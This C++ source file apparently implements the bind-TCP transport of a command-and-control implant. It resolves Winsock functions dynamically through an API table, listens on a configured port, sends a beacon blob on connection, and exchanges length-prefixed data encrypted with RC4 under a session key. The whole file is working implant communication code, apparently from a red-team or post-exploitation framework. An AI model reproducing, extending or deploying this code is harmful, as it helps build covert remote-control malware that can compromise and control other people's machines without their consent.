#include "ConnectorTCP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Crypt.h"
#include "utils.h"

void* ConnectorTCP::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

void ConnectorTCP::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(ConnectorTCP));
}

ConnectorTCP::ConnectorTCP()
{
    this->functions = (TCPFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(TCPFUNC));

    this->functions->LocalAlloc   = ApiWin->LocalAlloc;
    this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
    this->functions->LocalFree    = ApiWin->LocalFree;
    this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
    this->functions->GetLastError = ApiWin->GetLastError;
    this->functions->GetTickCount = ApiWin->GetTickCount;

	this->functions->WSAStartup		 = ApiWin->WSAStartup;
	this->functions->WSACleanup		 = ApiWin->WSACleanup;
	this->functions->socket			 = ApiWin->socket;
	this->functions->ioctlsocket	 = ApiWin->ioctlsocket;
	this->functions->WSAGetLastError = ApiWin->WSAGetLastError;
	this->functions->closesocket	 = ApiWin->closesocket;
	this->functions->listen			 = ApiWin->listen;
	this->functions->bind			 = ApiWin->bind;
	this->functions->select			 = ApiWin->select;
	this->functions->accept		     = ApiWin->accept;
	this->functions->__WSAFDIsSet	 = ApiWin->__WSAFDIsSet;
	this->functions->send		     = ApiWin->send;
	this->functions->recv		     = ApiWin->recv;
	this->functions->shutdown		 = ApiWin->shutdown;
}

BOOL ConnectorTCP::SetProfile(void* profilePtr, BYTE* beatData, ULONG beatDataSize)
{
	ProfileTCP profile = *(ProfileTCP*)profilePtr;

	if (beatData && beatDataSize) {
		this->beat = (BYTE*)MemAllocLocal(beatDataSize);
		if (this->beat) {
			memcpy(this->beat, beatData, beatDataSize);
			this->beatSize = beatDataSize;
		}
	}
	this->port = profile.port;

	WSAData WSAData;
	if (this->functions->WSAStartup(514u, &WSAData) < 0)
		return FALSE;

	SOCKET sock = this->functions->socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1)
		return FALSE;

	struct sockaddr_in saddr = { 0 };
	saddr.sin_family = AF_INET;
	saddr.sin_port = ((this->port >> 8) & 0x00FF) | ((this->port << 8) & 0xFF00); // port

	if (this->functions->bind(sock, (struct sockaddr*)&saddr, sizeof(sockaddr)) == -1) {
		this->functions->closesocket(sock);
		return FALSE;
	}

	if (this->functions->listen(sock, 1) == -1) {
		this->functions->closesocket(sock);
		return FALSE;
	}

	this->prepend = profile.prepend;
	this->SrvSocket = sock;
	return TRUE;
}

BOOL CheckState(SOCKET sock, int timeoutMs)
{
	ULONG endTime = ApiWin->GetTickCount() + timeoutMs;
	while (ApiWin->GetTickCount() < endTime) {

		fd_set readSet;
		FD_ZERO(&readSet);
		FD_SET(sock, &readSet);
		timeval timeout = { 0, 100 };

		int selResult = ApiWin->select(0, &readSet, NULL, NULL, &timeout);
		if (selResult == 0)
			return TRUE;

		if (selResult == SOCKET_ERROR)
			return FALSE;

		char buf;
		int recvResult = ApiWin->recv(sock, &buf, 1, MSG_PEEK);
		if (recvResult == 0)
			return FALSE;

		if (recvResult < 0)
		{
			int err = ApiWin->WSAGetLastError();
			if (err == WSAEWOULDBLOCK)
				return TRUE;
		}
		else return TRUE;
	}
	return FALSE;
}

void ConnectorTCP::SendData(BYTE* data, ULONG data_size)
{
    this->recvSize = 0;


    if (this->functions->send(this->ClientSocket, (const char*)&data_size, 4, 0) == -1) {
        this->recvSize = -1;
        return;
    }

    if (data && data_size) {
        DWORD index = 0;
        DWORD size = 0;
        DWORD NumberOfBytesWritten = 0;
        while (1) {
            size = data_size - index;
            if (data_size - index > 0x1000)
                size = 0x1000;

            NumberOfBytesWritten = this->functions->send(this->ClientSocket, (const char*)(data + index), size, 0);
            if (NumberOfBytesWritten == -1) {
                this->recvSize = -1;
                return;
            }

            index += NumberOfBytesWritten;
            if (index >= data_size)
                break;
        }
    }
}

void ConnectorTCP::ReceiveData()
{
    this->recvSize = 0;

    ULONG dataLength = 0;
    int recvResult = this->functions->recv(this->ClientSocket, (PCHAR)&dataLength, 4, 0);
    if (recvResult == 0) {
        this->recvSize = -1;
        return;
    }
    if (recvResult == -1) {
        this->recvSize = -1;
        return;
    }

    if (dataLength == 0) {
        this->recvSize = 0;
        return;
    }

    if (dataLength > this->allocaSize) {
        this->recvData   = (BYTE*)this->functions->LocalReAlloc(this->recvData, dataLength, 0);
        this->allocaSize = dataLength;
    }

    ULONG index = 0;
    int NumberOfBytesRead = 0;
    while (index < dataLength) {
        NumberOfBytesRead = this->functions->recv(this->ClientSocket, (PCHAR)this->recvData + index, dataLength - index, 0);
        if (NumberOfBytesRead == 0) {
            this->recvSize = -1;
            return;
        }
        if (NumberOfBytesRead == -1) {
            this->recvSize = -1;
            return;
        }
        index += NumberOfBytesRead;

        if (index > dataLength) {
            this->recvSize = -1;
            return;
        }
    }
    this->recvSize = index;
}

BYTE* ConnectorTCP::RecvData()
{
    return this->recvData;
}

int ConnectorTCP::RecvSize()
{
    return this->recvSize;
}

void ConnectorTCP::RecvClear()
{
	if (this->recvData && this->allocaSize) {
		if (this->recvSize > 0)
			memset(this->recvData, 0, this->recvSize);
		else 
			memset(this->recvData, 0, this->allocaSize);
	}
}

void ConnectorTCP::Listen()
{
	fd_set readfds;
	readfds.fd_count = 1;
	readfds.fd_array[0] = this->SrvSocket;

	while (1) {
		int sel = this->functions->select(0, &readfds, 0, 0, NULL);
		if (sel > 0 && readfds.fd_array[0] == this->SrvSocket) {
			SOCKET clientSock = this->functions->accept(this->SrvSocket, 0, 0);
			if (clientSock != -1) {
				this->ClientSocket = clientSock;
				break;
			}
		}
	}

    this->recvData = (BYTE*)this->functions->LocalAlloc(LPTR, 0x100000);
    this->allocaSize = 0x100000;
}

BOOL ConnectorTCP::WaitForConnection()
{
    this->Listen();
    this->SendData(this->beat, this->beatSize);
    this->connected = TRUE;
    return TRUE;
}

BOOL ConnectorTCP::IsConnected()
{
    return this->connected;
}

void ConnectorTCP::Disconnect()
{
    this->DisconnectInternal();
    this->connected = FALSE;
}

void ConnectorTCP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
    this->recvSize = 0;

    if (plainData && plainSize > 0) {
        EncryptRC4(plainData, plainSize, sessionKey, 16);
    }


    this->SendData(plainData, plainSize);
    if (this->recvSize < 0) {
        this->connected = FALSE;
        return;
    }


    this->ReceiveData();
    if (this->recvSize < 0) {
        this->connected = FALSE;
        return;
    }

    if (this->recvSize > 0 && this->recvData) {
        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
    }
}

void ConnectorTCP::DisconnectInternal()
{
    if (this->allocaSize && this->recvData) {
        memset(this->recvData, 0, this->allocaSize);
        this->functions->LocalFree(this->recvData);
        this->recvData = NULL;
    }

    this->allocaSize = 0;
    this->recvData = 0;
	this->functions->shutdown(this->ClientSocket, 2);
	this->functions->closesocket(this->ClientSocket);
}

void ConnectorTCP::CloseConnector()
{
	if (this->beat && this->beatSize) {
		MemFreeLocal((LPVOID*)&this->beat, this->beatSize);
		this->beat = NULL;
		this->beatSize = 0;
	}
	this->functions->shutdown(this->SrvSocket, 2);
	this->functions->closesocket(this->SrvSocket);
}